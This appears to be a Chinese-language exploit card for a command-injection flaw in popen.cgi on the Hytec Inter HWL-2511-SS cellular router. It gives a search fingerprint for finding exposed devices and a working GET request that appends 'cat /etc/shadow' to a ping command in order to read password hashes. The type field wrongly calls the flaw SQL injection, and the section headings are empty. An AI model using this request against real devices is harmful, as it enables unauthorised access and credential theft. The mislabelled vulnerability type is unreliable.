# HytecInterHWL-2511-SS路由器popen.cgi命令注入漏洞

- **系统**：HytecInterHWL　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="PROSCEND(及其他) Celluar Router "`
- **请求**：`GET /cgi-bin/popen.cgi?command=ping%20-c%201.1.1.1;cat%20/etc/shadow&v=0.130303344313792 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Sec-Fetch-User: ?1`　`If-Modified-Since: Sun, 13 Oct 2019 19:17:17 GMT`　`If-None-Match: "18111784"`

**请求体 / payload**
```

```

**其他**
- Hytec Inter HWL-2511-SS路由器popen.cgi命令注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Hytec Inter HWL-2511-SS